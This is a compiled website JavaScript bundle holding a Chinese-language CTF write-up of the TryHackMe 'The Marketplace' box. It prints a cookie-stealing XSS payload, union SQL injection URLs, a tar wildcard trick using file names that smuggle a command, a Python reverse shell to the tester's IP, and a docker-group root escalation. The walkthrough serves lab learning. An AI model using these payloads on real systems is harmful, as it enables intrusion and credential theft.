"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[691],{78820:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>h,frontMatter:()=>r,metadata:()=>i,toc:()=>l});var t=a(74848),s=a(28453);const r={sidebar_position:90,tags:["Easy","Linux","SQLI","SUDO","docker"],title:"The Marketplace",description:"The Marketplace",sidebar_label:"The Marketplace",slug:"/tryhackme/90"},c="The Marketplace",i={id:"box/TryHackMe/90",title:"The Marketplace",description:"The Marketplace",source:"@site/docs/box/TryHackMe/90.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/90",permalink:"/docs/tryhackme/90",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"SUDO",permalink:"/docs/tags/sudo"},{label:"docker",permalink:"/docs/tags/docker"}],version:"current",sidebarPosition:90,frontMatter:{sidebar_position:90,tags:["Easy","Linux","SQLI","SUDO","docker"],title:"The Marketplace",description:"The Marketplace",sidebar_label:"The Marketplace",slug:"/tryhackme/90"},sidebar:"boxSidebar",previous:{title:"Overpass 3 - Hosting",permalink:"/docs/tryhackme/89"},next:{title:"Watcher",permalink:"/docs/tryhackme/91"}},o={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"jake",id:"jake",level:3},{value:"jake \u2014&gt; michael",id:"jake--michael",level:3},{value:"michael \u2014&gt; root",id:"michael--root",level:3}];function p(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"the-marketplace",children:"The Marketplace"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-115-253:~/marketplace# nmap -sTCV  -p 22,80,32768 --min-rate 1000 10.10.66.167\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-13 12:54 BST\nNmap scan report for ip-10-10-66-167.eu-west-1.compute.internal (10.10.66.167)\nHost is up (0.00014s latency).\n\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)\n|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)\n|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (EdDSA)\n80/tcp    open  http    nginx 1.19.2\n| http-robots.txt: 1 disallowed entry \n|_/admin\n|_http-server-header: nginx/1.19.2\n|_http-title: The Marketplace\n32768/tcp open  http    Node.js (Express middleware)\n| http-robots.txt: 1 disallowed entry \n|_/admin\n|_http-title: The Marketplace\nMAC Address: 02:F5:73:6C:93:E3 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n"})}),"\n",(0,t.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,t.jsx)(n.p,{children:"\u8bbf\u95ee\u9875\u9762\u540e, \u6211\u7ecf\u8fc7\u4e86\u7b80\u5355\u7684\u641c\u67e5\u5224\u5b9a\u9700\u8981\u8fdb\u884c XSS \u6765\u76d7\u53d6\u7ba1\u7406\u5458\u7684 Cookie \u5185\u5bb9, \u7ed3\u5408\u5206\u6790\u552f\u4e00\u4e00\u79cd\u53ef\u4ee5\u5c06\u6211\u4eec\u63d0\u4ea4\u7684\u5185\u5bb9\u63a8\u9001\u5230\u7ba1\u7406\u5458\u7684\u65b9\u5f0f\u662f\u4e3e\u62a5\u4e00\u4e2a\u6587\u7ae0, \u6240\u4ee5\u6211\u5c1d\u8bd5\u521b\u5efa\u4e00\u4e2a\u6587\u7ae0\u5e76\u8fdb\u884c\u4e3e\u62a5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'<script>fetch("http://10.10.115.253:8000/"+document.cookie)<\/script>\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215903.png",alt:"20240703215903"})}),"\n",(0,t.jsx)(n.p,{children:"\u5f53\u521b\u5efa\u4e4b\u540e\u76f4\u63a5\u4e3e\u62a5\u6211\u4eec\u7684\u6587\u7ae0, \u5e76\u67e5\u770b\u6211\u4eec\u7684\u6d88\u606f,\u56e0\u4e3a\u5f53\u7ba1\u7406\u5458\u67e5\u770b\u540e\u4f1a\u7ed9\u6211\u4eec\u53d1\u8bf7\u6c42, \u8bf7\u6c42\u6570\u636e\u4e3a\u5176 cookie , \u5982\u4e0b\u6240\u793a"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215914.png",alt:"20240703215914"})}),"\n",(0,t.jsx)(n.p,{children:"\u83b7\u53d6\u5230\u7ba1\u7406\u5458\u7684cookie \u540e\u8fdb\u884c\u767b\u9646, \u7ecf\u8fc7\u7b80\u5355\u7684\u641c\u7d22\u540e\u6211\u53d1\u73b0\u5176\u5728\u67e5\u770b\u7528\u6237\u7684\u4f4d\u7f6e, \u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703220106.png",alt:"20240703220106"})}),"\n",(0,t.jsx)(n.p,{children:"\u5f88\u660e\u663e union \u8054\u5408\u6ce8\u5165"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703220116.png",alt:"20240703220116"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"http://10.10.133.138/admin?user=0 union select 1,database(),3,4\nhttp://10.10.133.138/admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables  where table_schema='marketplace'\nhttp://10.10.133.138/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns  where table_name='users'    --\x3e id,username,password,isAdministrator\n\nhttp://10.10.133.138/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns  where table_name='messages' --\x3e  id,user_from,user_to,message_content,is_read \nhttp://10.10.133.138/admin?user=0 union select 1,group_concat(id, '==', message_content),3,4 from messages\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u8fd9\u91cc\u4eceusers \u8868\u4e2d\u5f97\u5230\u7684\u6570\u636e\u6211\u5e76\u4e0d\u80fd\u7834\u89e3\u54c8\u5e0c, \u67e5\u770b messages \u8868\u65f6\u6211\u53d1\u73b0\u5176\u4e2d\u6709\u5173\u4e8e SSH \u767b\u9646\u7684\u5185\u5bb9"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703220127.png",alt:"20240703220127"})}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"jake",children:"jake"}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u4e0a\u9762\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c\u6d4b\u8bd5\u770b\u770b\u662f\u54ea\u4e2a\u7528\u6237\u7684"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703220143.png",alt:"20240703220143"})}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c SSH \u767b\u9646"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-115-253:~/marketplace# ssh jake@10.10.66.167.\njake@10.10.66.167's password: \n......\n\njake@the-marketplace:~$ id\nuid=1000(jake) gid=1000(jake) groups=1000(jake)\n"})}),"\n",(0,t.jsx)(n.h3,{id:"jake--michael",children:"jake \u2014> michael"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u53d1\u73b0 jake \u7528\u6237\u53ef\u4ee5\u4ee5 michael \u7684\u8eab\u4efd\u8fd0\u884c\u4e00\u4e2a\u811a\u672c"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703220218.png",alt:"20240703220218"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7ed3\u5408 ",(0,t.jsx)(n.code,{children:"backup.sh"})," \u6587\u4ef6, \u6211\u5f00\u59cb\u5c1d\u8bd5\u4e86\u901a\u914d\u7b26\u5229\u7528"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'jake@the-marketplace:/opt/backups$ rm -rf backup.tar\njake@the-marketplace:/opt/backups$ cat << EOF >michel.sh \npython3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.115.253",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'\nEOF\njake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh michel.sh"\njake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1\njake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh\nBacking up files...\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u7136\u540e\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Shell"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703220237.png",alt:"20240703220237"})}),"\n",(0,t.jsx)(n.h3,{id:"michael--root",children:"michael \u2014> root"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u53d1\u73b0\u7528\u6237\u662f docker \u7ec4\u7528\u6237, \u6240\u4ee5\u6211\u4f7f\u7528 docker \u8fdb\u884c\u4e86\u63d0\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(remote) michael@the-marketplace:/home/michael$ \ndocker images(remote) michael@the-marketplace:/home/michael$ docker images\nREPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE\nthemarketplace_marketplace   latest              6e3d8ac63c27        3 years ago         2.16GB\nnginx                        latest              4bb46517cac3        3 years ago         133MB\nnode                         lts-buster          9c4cc2688584        3 years ago         886MB\nmysql                        latest              0d64f46acfd1        3 years ago         544MB\nalpine                       latest              a24bb4013296        3 years ago         5.57MB\n(remote) michael@the-marketplace:/$ docker run -it --rm -v /:/mnt mysql sh\nroot@cc8ffe0deb9e:/# id\nuid=0(root) gid=0(root) groups=0(root)\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(p,{...e})}):p(e)}},28453:(e,n,a)=>{a.d(n,{R:()=>c,x:()=>i});var t=a(96540);const s={},r=t.createContext(s);function c(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);